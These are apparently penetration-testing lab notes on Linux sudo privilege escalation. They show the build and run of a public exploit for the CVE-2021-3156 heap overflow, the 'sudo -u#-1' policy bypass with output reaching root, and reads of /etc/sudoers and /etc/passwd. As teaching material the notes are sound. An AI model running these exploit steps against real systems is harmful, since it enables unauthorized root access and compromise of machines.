```shell
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d' 
[sudo] password for cry0l1t3: **********
```

One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

To find out the version of `sudo`, the following command is sufficient:

```shell
cry0l1t3@nix02:~$ sudo -V | head -n1 

Sudo version 1.8.31
```

```shell
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git 
cry0l1t3@nix02:~$ cd CVE-2021-3156 
cry0l1t3@nix02:~$ make
```

When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.

![](Screenshot%202026-08-11%20at%2013.06.01.png)

We can find out which version of the operating system we are dealing with using the following command:

```shell
cry0l1t3@nix02:~$ cat /etc/lsb-release
```

Next, we specify the respective ID for the version operating system and run the exploit with our payload.
![](Screenshot%202026-08-11%20at%2013.06.32.png)
## Sudo Policy Bypass

```shell
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

```shell
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3 

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

```shell
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```